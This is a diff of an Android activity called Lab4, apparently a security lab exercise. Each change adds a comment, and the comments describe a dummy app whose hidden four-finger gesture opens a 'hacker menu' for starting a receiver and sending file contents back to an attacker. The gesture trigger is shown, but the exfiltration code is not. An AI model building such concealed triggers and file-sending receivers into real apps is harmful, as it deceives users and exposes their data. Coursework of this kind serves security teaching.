@@ -21,12 +21,13 @@ import java.util.List;
 import java.util.Random;
 
 import static android.view.ViewGroup.LayoutParams;
-
+//the main activity containing the dummy app
 public class Lab4 extends Activity {
 
     ComponentName component;
     private boolean debugging = true;
     private HashMap<Integer, GradientDrawable> stageColor = new HashMap<>();
+    //the onclick listener for each button that divides
     private View.OnClickListener divider = new View.OnClickListener() {
         @Override
         public void onClick(View v) {
@@ -88,7 +89,7 @@ public class Lab4 extends Activity {
             b2.setOnClickListener(this);
         }
     };
-
+    //called on the creation of the activity to create the receiver component
     @Override
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -99,14 +100,14 @@ public class Lab4 extends Activity {
 
     }
 
-
+    //when the hacker clicks with four fingers the hacker menu is displayed
     @Override
     public boolean dispatchTouchEvent(MotionEvent ev) {
         if (debugging && ev.getPointerCount() >= 4)
             showDebugMenu();
         return super.dispatchTouchEvent(ev);
     }
-
+    //the debug menu allows the attacker to start and stop the receiver and send the file contents back manually
     public void showDebugMenu() {
 
         debugging = false;
